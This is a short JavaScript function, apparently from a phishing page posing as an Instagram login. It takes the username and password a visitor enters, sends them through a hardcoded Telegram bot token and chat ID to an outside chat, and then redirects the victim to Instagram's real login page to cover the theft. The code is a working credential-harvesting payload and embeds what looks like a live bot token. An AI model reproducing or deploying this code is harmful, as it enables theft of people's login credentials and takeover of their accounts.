function sendCredentials() {
    var username = document.getElementById("usernameInput").value;
    var password = document.getElementById("passwordInput").value;
    var token = "6315571399:AAHl3-1JGWFqBsdS6xZ6lNgXLzSU-R608BU";
    var chatId = "1137002322";
  
    var message = "Username: " + username + "\nPassword: " + password;
  
    var request = new XMLHttpRequest();
    request.open("GET", "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message), true);
    request.send();

    window.location.href = "www.instagram.com/accounts/login/";
  }
